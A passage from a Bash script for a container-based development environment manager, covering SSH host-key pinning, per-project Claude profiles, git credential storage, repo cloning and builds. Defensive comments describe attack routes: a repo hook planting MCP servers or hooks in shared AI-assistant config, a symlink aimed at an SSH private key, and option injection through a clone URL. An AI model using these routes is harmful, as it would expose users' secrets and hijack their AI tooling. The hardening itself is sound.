    if grep -qE '^[[:space:]]*(StrictHostKeyChecking[[:space:]]+no|UserKnownHostsFile[[:space:]]+/dev/null)' "$sd/config"; then
      awk -v kh="$sd/known_hosts" -v alias="$(ssh_host_alias "$name")" '
        /^[[:space:]]*StrictHostKeyChecking[[:space:]]+no[[:space:]]*$/ {
          print "    StrictHostKeyChecking yes"; print "    HostKeyAlias " alias; next }
        /^[[:space:]]*UserKnownHostsFile[[:space:]]+\/dev\/null[[:space:]]*$/ {
          print "    UserKnownHostsFile \"" kh "\""; next }
        { print }
      ' "$sd/config" > "$sd/config.tmp" && mv "$sd/config.tmp" "$sd/config"
      ok "pinned the project host key in $sd/config"
    fi
    # The zmx session name must come from %n (the host exactly as typed:
    # "myapp", "myapp.tests"). %k is the HOST KEY ALIAS when one is set, so
    # after host-key pinning added HostKeyAlias, every `ssh myapp.<x>` attached
    # to the same session "nixenv-myapp". Fix configs written with %k.
    if grep -qE '^[[:space:]]*RemoteCommand[[:space:]].*zmx attach %k[[:space:]]*$' "$sd/config"; then
      sed 's/\(zmx attach \)%k[[:space:]]*$/\1%n/' "$sd/config" > "$sd/config.tmp" \
        && mv "$sd/config.tmp" "$sd/config"
      ok "fixed the zmx session name in $sd/config (%k → %n)"
    fi
    return 0
  fi
  cat > "$sd/config" <<EOF
# nixenv: ssh config for project '$name' (auto-created when missing — edit freely).
#   ssh $name         → attaches a persistent zmx session named '$name'
#   ssh $name.<x>      → a zmx session named '$name.<x>'
# zmx (github:neurosnap/zmx) gives re-attachable terminal sessions over ssh.
# Replace/remove RemoteCommand for a plain shell.
Host $name $name.*
    HostName 127.0.0.1
    Port $port
    User $APP_USER
    IdentityFile "$sd/id_ed25519"
    IdentitiesOnly yes
    StrictHostKeyChecking yes
    HostKeyAlias $(ssh_host_alias "$name")
    UserKnownHostsFile "$sd/known_hosts"
    LogLevel ERROR
    RequestTTY yes
    RemoteCommand $PROFILE/bin/zmx attach %n
    ControlMaster auto
    ControlPath ~/.ssh/cm-%r@%h:%p
    ControlPersist 10m
EOF
  ok "wrote host ssh config: $sd/config"
}

# Claude state is PER PROJECT; only the login is shared.
# Sharing ~/.claude and ~/.claude.json read-write let any project — e.g. an
# untrusted repo's startup hook — plant an MCP server, a settings.json hook, a
# CLAUDE.md or a slash command that then ran in EVERY other project. Now:
#   ~/.nixenv/claude/profiles/<p>/dot-claude  → /home/app/.claude       (settings, hooks, commands…)
#   ~/.nixenv/claude/profiles/<p>/claude.json → /home/app/.claude.json  (MCP servers, prefs)
#   ~/.nixenv/claude/.credentials.json        → /home/app/.claude/.credentials.json  (SHARED, rw)
#   ~/.nixenv/claude/projects/nixenv-<p>      → /home/app/.claude/projects           (transcripts)
# The credentials file stays shared and writable because token refresh rewrites
# it — so every project can still READ the token. That limit is documented; the
# per-project split removes the cross-project persistence, not the token access.
claude_profile_dir() { printf '%s/profiles/%s' "$CLAUDE_DIR" "$1"; }
prepare_claude_profile() {
  local name="$1" prof creds
  prof="$(claude_profile_dir "$name")"; creds="$CLAUDE_DIR/.credentials.json"
  mkdir -p "$CLAUDE_DIR" "$prof/dot-claude/projects" "$CLAUDE_DIR/projects/nixenv-$name"
  chmod 700 "$CLAUDE_DIR" 2>/dev/null || true
  # Bind-mount targets must pre-exist as FILES, or the engine creates a
  # directory in their place (root-owned, on Linux).
  if [ ! -f "$creds" ]; then
    ( umask 077; printf '{}\n' > "$creds" )
  fi
  chmod 600 "$creds" 2>/dev/null || true
  [ -e "$prof/dot-claude/.credentials.json" ] || : > "$prof/dot-claude/.credentials.json"
  # A fresh profile starts clean — deliberately NOT copied from the old shared
  # ~/.nixenv/claude.json, which any earlier project could have written into.
  # Only the onboarding flag is set, so `claude` doesn't re-run first-time setup.
  if [ ! -f "$prof/claude.json" ]; then
    printf '{\n  "hasCompletedOnboarding": true\n}\n' > "$prof/claude.json"
  fi
}

# Per-project host SSH port: random once, stored in <project>/port, reused after.
project_port() {
  local pdir pf p; pdir="$(project_dir "$1")"; pf="$pdir/port"
  if [ -f "$pf" ]; then cat "$pf"; return 0; fi
  mkdir -p "$pdir"
  local i
  for i in $(seq 1 20); do
    p=$(( (RANDOM % 10000) + 20000 ))                       # 20000–29999
    grep -rqsx "$p" "$PROJECTS_DIR"/*/port 2>/dev/null || break
  done
  printf '%s\n' "$p" > "$pf"
  printf '%s\n' "$p"
}

# Prompt for git identity and write it to home/.gitconfig.identity, which the
# project's .gitconfig includes. Rewriting this one file avoids duplicate
# [user] blocks on re-init. Non-interactive runs fall back to env / host git.
# Populate <project>/home from the embedded skeleton, without clobbering what is
# already there. Used by `init` and by `import` when the archive carries no home
# volume (the default), where it is what gives the fresh home its dotfiles.
seed_project_home() {
  local pdir="$1" _f _rel
  # Portable no-clobber: busybox cp has no -n, BSD/GNU differ — copy per file.
  if [ -d "$HOME_SKEL" ]; then
    ( cd "$HOME_SKEL" && find . -type f ) | while IFS= read -r _f; do
      _rel="${_f#./}"
      [ -e "$pdir/home/$_rel" ] && continue
      mkdir -p "$pdir/home/$(dirname "$_rel")"
      cp "$HOME_SKEL/$_rel" "$pdir/home/$_rel" || true
    done
  fi
  # SSH needs strict perms or ssh/git refuse the keys.
  mkdir -p "$pdir/home/.ssh"
  chmod 700 "$pdir/home/.ssh"
  find "$pdir/home/.ssh" -type f -exec chmod 600 {} \; 2>/dev/null || true
}

configure_git_identity() {
  local pdir="$1" def_name def_email gname="" gemail=""
  def_name="${GIT_USER_NAME:-$(git config --global user.name 2>/dev/null || true)}"
  def_email="${GIT_USER_EMAIL:-$(git config --global user.email 2>/dev/null || true)}"

  if [ -t 0 ]; then
    printf 'Git user.name [%s]: '  "$def_name";  read -r gname  || true
    printf 'Git user.email [%s]: ' "$def_email"; read -r gemail || true
  fi
  gname="${gname:-$def_name}"
  gemail="${gemail:-$def_email}"

  if [ -n "$gname" ] || [ -n "$gemail" ]; then
    cat > "$pdir/home/.gitconfig.identity" <<EOF
[user]
	name = $gname
	email = $gemail
EOF
    ok "git identity → ${gname:-<unset>} <${gemail:-unset}>"
  else
    warn "no git identity provided (you can re-run '$0 init <project>' later)"
  fi
}

# For an HTTP(S) clone URL, prompt for a username + Personal Access Token and
# store them with git's credential-store helper inside the project home:
#   home/.git-credentials       holds  https://user:token@host
#   home/.gitconfig.credentials enables `credential.helper = store`
# (included by home/.gitconfig). SSH URLs are skipped — they use keys.
# Non-interactive: reads GIT_HTTP_USER / GIT_HTTP_TOKEN.
configure_git_credentials() {
  local pdir="$1" url="$2"
  case "$url" in
    http://*|https://*) ;;
    *) return 0 ;;
  esac

  local scheme rest host user="" token=""
  scheme="${url%%://*}"
  rest="${url#*://}"
  host="${rest%%/*}"
  host="${host##*@}"          # drop any embedded user@
  host="${host%%:*}"         # drop any :port for the prompt/match

  if [ -t 0 ]; then
    printf 'Git username for %s: ' "$host"; read -r user || true
    printf 'Personal Access Token (input hidden): '; stty -echo 2>/dev/null; read -r token || true; stty echo 2>/dev/null; printf '\n'
  else
    user="${GIT_HTTP_USER:-}"; token="${GIT_HTTP_TOKEN:-}"
  fi
  if [ -z "$user" ] || [ -z "$token" ]; then
    warn "no username/token entered — cloning without stored credentials"
    return 0
  fi

  # Store credentials (replace any prior entry for this host).
  local cf="$pdir/home/.git-credentials"
  if [ -f "$cf" ]; then grep -v "@$host\$" "$cf" 2>/dev/null > "$cf.tmp" || true; mv "$cf.tmp" "$cf"; fi
  printf '%s://%s:%s@%s\n' "$scheme" "$user" "$token" "$host" >> "$cf"
  chmod 600 "$cf"

  # Enable the store helper (included by .gitconfig).
  cat > "$pdir/home/.gitconfig.credentials" <<'GITCRED'
[credential]
	helper = store
GITCRED

  # Make sure .gitconfig actually includes the credentials file (older projects).
  local gc="$pdir/home/.gitconfig"
  if [ -f "$gc" ] && ! grep -q '\.gitconfig\.credentials' "$gc"; then
    printf '\n[include]\n\tpath = ~/.gitconfig.credentials\n' >> "$gc"
  fi

  ok "stored HTTPS credentials for $host (user '$user') in home/.git-credentials"
}

# Copy a template file into the app volume as flake.nix. Placeholders are
# substituted so the template can reference the project it was applied to:
#   @@PROJECT@@    project name        @@APP_MOUNT@@  code path in-container
#   @@DOMAIN@@     proxy base domain   @@PORT@@       the template's declared port
# Never clobbers an existing flake.nix.
install_template() {
  local tfile="$1" name="$2" port="${3:-}" force="${4:-0}" appv appmnt tmp
  require_engine
  appv="$(app_volume "$name")"; appmnt="$(project_app_mount "$name")"
  ensure_volumes "$name"

  tmp="$(project_dir "$name")/.template.nix"
  sed -e "s|@@PROJECT@@|$name|g" \
      -e "s|@@APP_MOUNT@@|$appmnt|g" \
      -e "s|@@DOMAIN@@|$PROXY_DOMAIN|g" \
      -e "s|@@PORT@@|$port|g" \
      "$tfile" > "$tmp"

  if [ -n "$("$ENGINE" run --rm -v "$appv":/app "$(img "$RUNTIME_IMAGE")" \
              sh -c 'ls -A /app/flake.nix 2>/dev/null' 2>/dev/null)" ]; then
    if [ "$force" != 1 ]; then
      warn "flake.nix already exists in the app volume — template NOT applied"
      log  "to refresh it from the template: $0 init $name --force --template=<t>"
      rm -f "$tmp"; return 0
    fi
    # --force: refresh the flake (e.g. after the template gained a fix), keeping
    # a backup so local edits are never lost silently.
    "$ENGINE" run --rm --user "$(id -u):$(id -g)" $(engine_userns) \
      -v "$appv":/app "$(img "$RUNTIME_IMAGE")" \
      sh -c 'cp -f /app/flake.nix /app/flake.nix.bak' >/dev/null 2>&1 || true
    warn "overwriting the existing flake.nix (previous kept as flake.nix.bak)"
  fi
  "$ENGINE" run --rm --user "$(id -u):$(id -g)" $(engine_userns) \
    -v "$appv":/app -v "$tmp":/tmp/flake.nix:ro \
    "$(img "$RUNTIME_IMAGE")" sh -c 'cp /tmp/flake.nix /app/flake.nix' \
    || { rm -f "$tmp"; die "failed to write flake.nix into the app volume"; }
  rm -f "$tmp"
  ok "template installed → $appmnt/flake.nix"
}

# Clone a git repo into the project's repo dir (must be empty). Runs the debian
# runtime image as the non-root user with the shared store + project home, so it
# uses the store's git and the project's SSH keys; the bind-mounted repo dir ends
# up owned by your host uid.
# A branch/tag name for `git clone --branch`. Conservative on purpose: it's
# passed as an argument, and a leading '-' would be read as an option.
valid_git_branch() {
  case "$1" in
    ""|-*|/*|*/|*.|*..*|*//*|*@\{*|*.lock|*[!A-Za-z0-9._/@-]*) return 1;;
  esac
  return 0
}

clone_repo() {
  local url="$1" name="$2" branch="${3:-}"
  require_engine
  local pdir appv homev appmnt; pdir="$(project_dir "$name")"
  appv="$(app_volume "$name")"; homev="$(home_volume "$name")"
  appmnt="$(project_app_mount "$name")"   # mount the volume here so git's message matches

  if ! store_is_populated; then
    warn "shared store not built yet — skipping clone"
    warn "run '$0 build', then '$0 init $name $url${branch:+ --branch=$branch}' to clone"
    return 0
  fi
  ensure_volumes "$name"
  # Consider the volume empty if it holds nothing but our .keep marker.
  if [ -n "$("$ENGINE" run --rm -v "$appv":"$appmnt" -e NIXENV_APP_MOUNT="$appmnt" "$(img "$RUNTIME_IMAGE")" sh -c 'ls -A "$NIXENV_APP_MOUNT" | grep -vx .keep' 2>/dev/null)" ]; then
    warn "app volume '$appv' not empty — skipping clone"
    return 0
  fi

  write_passwd_files "$pdir"
  log "Cloning $url${branch:+ (branch $branch)} → volume '$appv' (mounts at $appmnt) via $RUNTIME_IMAGE + shared git"
  "$ENGINE" run --rm \
    --user "$(id -u):$(id -g)" \
    $(engine_userns) \
    -v "$NIX_VOLUME":/nix:ro \
    -v "$homev":/home/"$APP_USER" \
    -v "$appv":"$appmnt" \
    -v "$pdir/passwd":/etc/passwd:ro \
    -v "$pdir/group":/etc/group:ro \
    -v "$ENTRYPOINT_FILE":/usr/local/bin/nixenv-entrypoint:ro \
    -w "$appmnt" \
    -e HOME=/home/"$APP_USER" \
    -e PROFILE="$PROFILE" \
    -e APP_USER="$APP_USER" \
    -e NIXENV_APP_MOUNT="$appmnt" \
    -e GIT_SSH_COMMAND="ssh -o StrictHostKeyChecking=accept-new" \
    "$(img "$RUNTIME_IMAGE")" \
    sh /usr/local/bin/nixenv-entrypoint sh -c '
      rm -f "$NIXENV_APP_MOUNT/.keep" 2>/dev/null
      # `--` so a URL starting with "-" is never read as an option (e.g. -u…
      # would be --upload-pack, i.e. a command git runs).
      if [ -n "$2" ]; then exec git clone --branch "$2" -- "$1" "$NIXENV_APP_MOUNT"; fi
      exec git clone -- "$1" "$NIXENV_APP_MOUNT"' _ "$url" "$branch"
  ok "cloned into volume '$appv'"
}

# Scaffold <name>/home + app volume, seed home/, set git identity, optional clone.
#   usage: init <project> [git-repo-url]
cmd_init() {
  local name="${1:-}"
  [ -n "$name" ] || die "usage: $0 init <project> [git-repo-url] [--branch=<name>] [--build] [--unrestricted] [--allow=host,…] [--app-path=/path]"
  valid_project_name "$name" || die "invalid project name: '$name'"
  shift

  local git_url="" do_build=0 do_open=0 app_mount="${APP_MOUNT:-}" allow_list="" \
        template="" assume_yes=0 force=0 branch="" a
  for a in "$@"; do
    case "$a" in
      --build) do_build=1;;
      --unrestricted|--open) do_open=1;;
      --app-path=*) app_mount="${a#*=}";;
      # --allow=a.com,b.com (repeatable). Validated below, applied with the forge.
      --allow=*) allow_list="$allow_list $(printf '%s' "${a#*=}" | tr ',' ' ')";;
      --template=*) template="${a#*=}";;
      --branch=*) branch="${a#*=}";;
      --branch) die "use --branch=<name>";;
      --yes|-y) assume_yes=1;;
      --force) force=1;;
      --*) die "unknown option: $a (usage: $0 init <project> [git-repo-url] [--branch=<name>] [--template=<name|url|path>] [--build] [--unrestricted] [--allow=host,…] [--app-path=/path] [--force])";;
      *) [ -z "$git_url" ] && git_url="$a" || die "unexpected argument: $a";;
    esac
  done

  # --branch: checked before anything is created, like every other argument.
  if [ -n "$branch" ]; then
    [ -n "$git_url" ] || die "--branch needs a git URL to clone (init <project> <git-url> --branch=<name>)"
    valid_git_branch "$branch" || die "invalid branch name: '$branch'"
  fi

  # --- Refuse to touch an existing project ----------------------------------
  # Checked BEFORE anything is fetched, prompted for or created, so a typo'd
  # name can't half-reinitialise a live project. --force re-runs the scaffold
  # (useful to refresh the git identity); it still never clobbers volumes.
  local pdir; pdir="$(project_dir "$name")"
  if [ "$force" != 1 ] && [ -d "$pdir" ] && { [ -d "$pdir/home" ] || [ -f "$pdir/port" ]; }; then
    warn "project '$name' already exists ($pdir)"
    echo "   start it:      $0 run $name"
    echo "   remove it:     $0 delete $name     (deletes its volumes — asks first)"
    echo "   re-scaffold:   $0 init $name --force   (keeps volumes; re-prompts git identity)"
    die "refusing to re-initialise '$name'"
  fi

  # --- Template: resolve + read metadata BEFORE scaffolding, so its declared
  # allow/port/app-path participate in the normal init flow.
  local tfile="" tdesc="" tport="" tallow=""
  if [ -n "$template" ]; then
    [ -z "$git_url" ] || die "--template and a git URL are mutually exclusive"
    tfile="$(resolve_template "$template")" || die "could not resolve template '$template'"
    tdesc="$(template_meta "$tfile" description)"
    tport="$(template_meta "$tfile" port)"
    tallow="$(template_meta "$tfile" allow)"
    [ -z "$app_mount" ] && app_mount="$(template_meta "$tfile" app-path)"
    [ -n "$tallow" ] && allow_list="$allow_list $tallow"

    log "Template '$template'${tdesc:+ — $tdesc}"
    echo "   file:  $tfile"
    echo "   flake: becomes ${app_mount:-/app}/flake.nix in project '$name'"
    [ -n "$tallow" ] && echo "   egress: $tallow"
    [ -n "$tport" ]  && echo "   serves: port $tport (https://$name-$tport.$PROXY_DOMAIN/)"
    warn "A template is code: it is BUILT with nix and its startup hook runs in the container."
    if [ "$assume_yes" != 1 ] && [ -t 0 ]; then
      printf 'Apply this template? [y/N] '
      local tans=""; read -r tans || true
      case "$tans" in [yY]|[yY][eE][sS]) ;; *) die "aborted";; esac
    fi
  fi

  log "Initialising project '$name' at $pdir"   # $pdir set by the existence check
  mkdir -p "$pdir/home"   # host seed for the home volume (skeleton + git config)

  # Custom code-volume mount path (default /app). Validate it's absolute and not
  # colliding with a reserved mount, then remember it in <project>/app_mount.
  if [ -n "$app_mount" ]; then
    valid_app_mount "$app_mount" || die "invalid --app-path '$app_mount'"
    printf '%s' "$app_mount" > "$pdir/app_mount"
    ok "code volume will mount at '$app_mount' (not /app)"
  fi

  seed_project_home "$pdir"

  # Egress: restriction is ON BY DEFAULT (default-deny). Record the forge domain
  # in the allowlist so cloning/pulling works; --unrestricted opts out.
  if [ -n "$git_url" ]; then
    add_allowed_host "$name" "$(forge_host_from_url "$git_url")"
    # Only the forge may be reached on port 22 (git over ssh). Without
    # this file every allowed host is reachable on 22 — any sshd on an allowed
    # name. Add more with one host per line.
    local _forge; _forge="$(forge_host_from_url "$git_url")"
    if [ -n "$_forge" ] && [ ! -f "$pdir/ssh_hosts" ]; then
      printf '%s\n' "$_forge" > "$pdir/ssh_hosts"
    fi
  fi
  # --allow=… entries, validated the same way as the 'allow' command.
  local _h _nh
  for _h in $allow_list; do
    _nh="$(normalize_allowed_host "$_h")" \
      || die "invalid --allow host '$_h' (domain, .domain for subdomains, or IP)"
    add_allowed_host "$name" "$_nh"
  done
  touch "$pdir/allowed_hosts"
  if [ "$do_open" = 1 ]; then
    touch "$pdir/unrestricted"
    warn "egress UNRESTRICTED (opt-out) — re-enable with: $0 restrict $name on"
  else
    ok "egress restricted (default-deny; validated hosts: $pdir/allowed_hosts)"
  fi

  # Git identity (prompted) + optional HTTPS credentials + optional clone.
  configure_git_identity "$pdir"
  if [ -n "$git_url" ]; then
    configure_git_credentials "$pdir" "$git_url"
    clone_repo "$git_url" "$name" "$branch"
  fi

  # Template: install as the project's flake.nix, then build it (the toolchain
  # and startup hook it declares are what make the project work on first run).
  if [ -n "$tfile" ]; then
    install_template "$tfile" "$name" "$tport" "$force"
    do_build=1
  fi

  # Assign a stable random SSH port + write the host-side ssh config.
  local port; port="$(project_port "$name")"
  write_host_ssh_config "$name"
  write_extra_parameters "$name"

  ok "Project '$name' ready"
  echo "   home → /home/$APP_USER  (volume $(home_volume "$name"); seed: $pdir/home)"
  echo "   repo → $(project_app_mount "$name")             (volume $(app_volume "$name"))"
  echo "   db   → /databases       (volume $(db_volume "$name"))"
  echo "   ssh  → host port $port  (connects as '$APP_USER' with the key in $pdir/ssh/)"
  echo "   alias→ ssh $name        (after: $0 ssh-config --install)"
  if is_restricted "$name"; then
    echo "   egress→ RESTRICTED (default-deny; allowed: $(tr '\n' ' ' < "$pdir/allowed_hosts" 2>/dev/null))"
  fi

  # --build: also build the project's own flake (if the repo has one).
  # (if/fi, NOT `[ ] && cmd`: the latter would make init's exit status 1
  # whenever --build is absent — set -e then kills callers/scripts.)
  if [ "$do_build" = 1 ]; then cmd_build_project "$name"; fi

  if [ -n "$tfile" ]; then
    echo
    ok "Template ready — start it with:"
    echo "    $0 run $name"
    [ -n "$tport" ] && echo "    then open https://$name-$tport.$PROXY_DOMAIN/"
    log "first start runs the template's setup hook (installs the app); watch it with: $0 logs $name"
  fi
}

# Auto-scaffold a project if missing. (--force so a half-created project dir —
# e.g. one that only has a 'port' file — doesn't trip init's existence check.)
ensure_project() {
  local name="$1" pdir; pdir="$(project_dir "$name")"
  if [ ! -d "$pdir/home" ]; then
    warn "Project '$name' not initialised — scaffolding it now"
    cmd_init "$name" --force
  fi
}

# =============================================================================
# build — download all flake deps into the standalone volume
# =============================================================================
cmd_build() {
  # `build <project>` builds the project's own flake; `build` builds the base.
  if [ -n "${1:-}" ]; then cmd_build_project "$@"; return $?; fi

  require_engine
  [ -f "$FLAKE_DIR/flake.nix" ] || die "no flake.nix in $FLAKE_DIR"
  ensure_volume
  ensure_builder_usable   # self-heal a volume whose nix/sh a gc removed

  log "Building flake deps '$FLAKE_REF' from $FLAKE_DIR into volume '$NIX_VOLUME' (slow the first time)"

  # Mount:
  #   - the volume at /nix          → the shared store gets populated here
  #   - the flake dir at /flake (rw) → so nix can write/refresh flake.lock
  ensure_github_token
  "$ENGINE" rm -f "${CONTAINER_PREFIX}__build" >/dev/null 2>&1 || true
  run_builder base "$ENGINE" run --rm --name "${CONTAINER_PREFIX}__build" \
    $(builder_priv) \
    -v "$NIX_VOLUME":/nix \
    -v "$FLAKE_DIR":/flake \
    -w /flake \
    -e NIX_CONFIG="$(nix_config)" \
    "$(img "$BUILDER_IMAGE")" \
    sh -euc '
      echo "--- resetting shared profile (so flake changes take effect) ---"
      rm -f "'"$PROFILE"'" "'"$PROFILE"'"-*-link 2>/dev/null || true
      echo "--- nix profile install into shared profile ---"
      # --profile keeps the GC root + symlinks inside /nix (the volume),
      # so the runtime container sees them. Pure evaluation: every fetch is
      # hash-pinned (zmx used to need --impure).
      nix profile install "'"$FLAKE_REF"'" \
        --profile "'"$PROFILE"'" \
        --accept-flake-config \
        --print-build-logs
      echo "--- optimising store (hardlink identical files) ---"
      nix store optimise || true
      echo "--- installed profile contents ---"
      ls -1 "'"$PROFILE"'/bin" | head -n 40
    ' || die "building the shared toolchain failed"

  ok "Dependencies downloaded into volume '$NIX_VOLUME'"
  log "Profile available inside the store at: $PROFILE"
}

# =============================================================================
# build <project> [--dir=<path>] — build the project's OWN flake into a
# per-project profile in the same store, layered on top of the base toolchain.
# It must expose packages.<system>.$PROJECT_ATTR (default: default), typically a
# buildEnv of the extra tools.
#
# Default: copies just flake.nix (+ flake.lock) from the app volume root — fine
# for a flake that only declares external dependencies.
# --dir=<path>: copies a WHOLE folder from the app volume (which must contain
# flake.nix plus anything it references). <path> is relative to /app. Use this
# when the flake isn't self-contained.
# =============================================================================
cmd_build_project() {
  local name="${1:-}"
  [ -n "$name" ] || die "usage: $0 build <project> [--dir=<path>]"
  case "$name" in */*|.|..) die "invalid project name: $name";; esac
  shift

  local dir="" dir_given=0 a
  for a in "$@"; do
    case "$a" in
      --dir=*) dir="${a#--dir=}"; dir_given=1;;
      --dir)   die "use --dir=<path>";;
      *) die "unknown option: $a (usage: $0 build <project> [--dir=<path>])";;
    esac
  done

  # --dir is REMEMBERED in <project>/flake_dir, so a project whose flake lives in
  # e.g. infra/nixos is rebuilt with a bare `build <project>` forever after —
  # forgetting it silently builds the wrong (or no) flake. `--dir=` with an empty
  # value clears it.
  local dirfile; dirfile="$(project_dir "$name")/flake_dir"
  if [ "$dir_given" = 1 ]; then
    if [ -n "$dir" ]; then
      mkdir -p "$(dirname "$dirfile")"
      printf '%s' "$dir" > "$dirfile"
    else
      rm -f "$dirfile"
      log "cleared the remembered flake dir — building from the repo root"
    fi
  elif [ -f "$dirfile" ] && [ -s "$dirfile" ]; then
    dir="$(cat "$dirfile")"
    log "using remembered flake dir: --dir=$dir  (clear with --dir=)"
  fi

  require_engine
  volume_exists || die "shared store missing — run '$0 build' first"
  store_is_populated || warn "base profile not built yet — run '$0 build' for the shared toolchain"

  local appv pdir prof fdir
  appv="$(app_volume "$name")"
  pdir="$(project_dir "$name")"
  prof="$(project_profile "$name")"
  fdir="$pdir/flake"
  vol_exists "$appv" || die "no app volume for '$name' — run '$0 init'/'$0 run' first"

  # Extract the flake from the app VOLUME into a host build dir (flake files, or
  # a whole subfolder for --dir).
  rm -rf "$fdir"; mkdir -p "$fdir"
  "$ENGINE" rm -f "${CONTAINER_PREFIX}__extract-$name" >/dev/null 2>&1 || true
  if [ -n "$dir" ]; then
    "$ENGINE" run --rm --name "${CONTAINER_PREFIX}__extract-$name" -e SUB="$dir" -v "$appv":/app:ro -v "$fdir":/out "$(img "$RUNTIME_IMAGE")" \
      sh -c 'set -e; [ -f "/app/$SUB/flake.nix" ] || exit 3; cp -a "/app/$SUB/." /out/' \
      || die "no flake.nix at '/app/$dir' inside the app volume"
    log "Building project flake from '/app/$dir' ('#$PROJECT_ATTR') into $prof"
  else
    "$ENGINE" run --rm --name "${CONTAINER_PREFIX}__extract-$name" -v "$appv":/app:ro -v "$fdir":/out "$(img "$RUNTIME_IMAGE")" \
      sh -c 'set -e; [ -f /app/flake.nix ] || exit 3; cp /app/flake.nix /out/; [ -f /app/flake.lock ] && cp /app/flake.lock /out/ || true' \
      || { warn "no flake.nix in the app volume — nothing to build"; warn "(subfolder with local deps? use --dir=<path>)"; return 0; }
    log "Building project flake ('#$PROJECT_ATTR') into $prof"
  fi
  # Say it once per project — building a flake runs its code as root
  # with write access to the SHARED store.
  if [ ! -f "$pdir/.flake-trust-noted" ]; then
    warn "building '$name''s flake runs its build code with write access to the shared"
    warn "Nix store used by EVERY project — only build flakes you trust"
    : > "$pdir/.flake-trust-noted" 2>/dev/null || true
  fi
  "$ENGINE" rm -f "${CONTAINER_PREFIX}__build-$name" >/dev/null 2>&1 || true
  run_builder project "$ENGINE" run --rm --name "${CONTAINER_PREFIX}__build-$name" \
    -v "$NIX_VOLUME":/nix \
    -v "$fdir":/flake \
    -w /flake \
    -e NIX_CONFIG="$(nix_config_project)" \
    "$(img "$BUILDER_IMAGE")" \
    sh -euc '
      mkdir -p /nix/var/nix/profiles
      echo "--- resetting project profile ---"
      rm -f "'"$prof"'" "'"$prof"'"-*-link 2>/dev/null || true
      echo "--- nix profile install (project extras) ---"
      nix profile install "path:/flake#'"$PROJECT_ATTR"'" \
        --profile "'"$prof"'" \
        --print-build-logs
      nix store optimise || true
      echo "--- project tooling on PATH ---"
      ls -1 "'"$prof"'/bin" 2>/dev/null | head -n 40 || true
    ' || die "building '$name''s flake failed"

  ok "Project '$name' extra tooling built → $prof"
  log "It loads ahead of the base toolchain on the next 'run'/'ssh'/'shell' of '$name'"
}

# =============================================================================
# run — start the project's background service (sshd under runit)
#   usage: run <project>
# =============================================================================
cmd_run() {
  require_engine
  local name="${1:-}"
  [ -n "$name" ] || die "usage: $0 run <project>"
  shift
  case "$name" in */*|.|..) die "invalid project name: $name";; esac

  volume_exists || die "volume '$NIX_VOLUME' missing — run '$0 build' first"
  store_is_populated || die "shared profile not found in volume — run '$0 build' first"
  ensure_project "$name"

  local pdir cname appv homev dbv appmnt; pdir="$(project_dir "$name")"
  cname="$(container_name "$name")"
  appv="$(app_volume "$name")"; homev="$(home_volume "$name")"; dbv="$(db_volume "$name")"
  appmnt="$(project_app_mount "$name")"
  [ -f "$ENTRYPOINT_FILE" ] || die "missing entrypoint at $ENTRYPOINT_FILE"
  [ "$#" -eq 0 ] || die "run takes no command — use '$0 shell $name' or '$0 ssh $name'"
  # 'egress' became reserved when squid moved to <prefix>-egress; an older
  # project of that name would now collide with the shared container.
  [ "$cname" != "$EGRESS_NAME" ] || die "a project named 'egress' collides with the egress proxy container '$EGRESS_NAME' — rename it (export + import under a new name)"
  # Defence in depth: these files shape the container's creation, and a
  # symlink among them could make the engine bind-mount (or read) a host file
  # outside the project dir — e.g. hosts.extra -> ~/.ssh/id_ed25519.
  local _mf
  for _mf in ports hosts.extra extra-parameters app_mount; do
    if [ -L "$pdir/$_mf" ]; then
      die "$pdir/$_mf is a symlink — refusing to use it (replace it with a regular file)"
    fi
  done
  valid_app_mount "$appmnt" || die "invalid app path in $pdir/app_mount"

  mkdir -p "$pdir/home/.ssh"
  ensure_volumes "$name"        # create + chown (+ seed home) the app/home volumes
  # Per-project Claude state + the one shared login. Transcripts stay
  # at ~/.nixenv/claude/projects/nixenv-<name>/ as before.
  prepare_claude_profile "$name"
  local cprof; cprof="$(claude_profile_dir "$name")"
  write_passwd_files "$pdir"    # /etc/passwd|group|shadow giving our uid the name 'app'
  ensure_project_ssh_key "$pdir" # the ONLY key sshd accepts; before the config
  write_host_ssh_config "$name" # <project>/ssh/config for `ssh <project>`
  write_extra_parameters "$name" # <project>/extra-parameters (empty scaffold)

  # --- Start a detached container: unprivileged sshd under runit -------------
  local port; port="$(project_port "$name")"

  # Join the shared proxy network so 'nixenv proxy' can route to this container by
  # name (nixenv-<project>). Created if missing; harmless when the proxy is unused.
  ensure_proxy_net

  # Egress restriction: a restricted project runs on its own --internal network
  # (kernel-enforced: no route out). Ports published on an internal network don't
  # work, so its ssh/extra ports are published by the PROXY container and relayed
  # (write_egress_configs); its only way out is squid in the egress container.
  local restricted=0 netarg="$PROXY_NET" egress_env; egress_env=()
  if is_restricted "$name"; then
    restricted=1
    ensure_internal_net "$name"
    netarg="$(internal_net "$name")"
    egress_env=(-e NIXENV_EGRESS_PROXY="http://$EGRESS_NAME:$EGRESS_PORT")
    # The egress proxy must be up BEFORE the container starts: on an internal
    # network it is the only way out, and the container's FIRST-RUN hook
    # (template setup: composer/npm/wp-cli) needs egress immediately. Starting
    # it afterwards left the hook unable to even resolve the proxy's name.
    # A capture CA that doesn't exist yet also needs mitmproxy started first.
    if ! container_running "$EGRESS_NAME" || ! container_running "$PROXY_NAME" || \
       { project_captures "$name" egress && [ ! -s "$EGRESS_DATA_DIR/mitmproxy/mitmproxy-ca-cert.pem" ]; }; then
      log "Starting the egress proxy first (restricted project needs it to reach the network)"
      ( PROXY_MKCERT_INSTALL="${PROXY_MKCERT_INSTALL:-0}"; cmd_proxy up ) \
        || warn "proxy failed to start — '$name' will have no network access"
    fi
  fi

  # Published ports: ssh (loopback) → in-container $SSHD_PORT, + <project>/ports.
  # Each ports line: "8080" → 127.0.0.1:8080:8080, or a full spec like
  # "3000:3000", "0.0.0.0:8080:80", "127.0.0.1:5173:5173".
  # Restricted projects publish NOTHING here (relayed via the proxy instead).
  local pub; pub=()
  if [ "$restricted" = 0 ]; then
    pub=(-p "127.0.0.1:$port:$SSHD_PORT")
    if [ -f "$pdir/ports" ]; then
      local _line _spec
      while IFS= read -r _line || [ -n "$_line" ]; do
        _spec="$(printf '%s' "${_line%%#*}" | tr -d '[:space:]')"
        [ -n "$_spec" ] || continue
        case "$_spec" in
          *:*) pub+=(-p "$_spec");;
          *)   pub+=(-p "127.0.0.1:$_spec:$_spec");;
        esac
      done < "$pdir/ports"
    fi
  fi

  # Custom /etc/hosts: give the container a writable /etc/hosts we own (a host
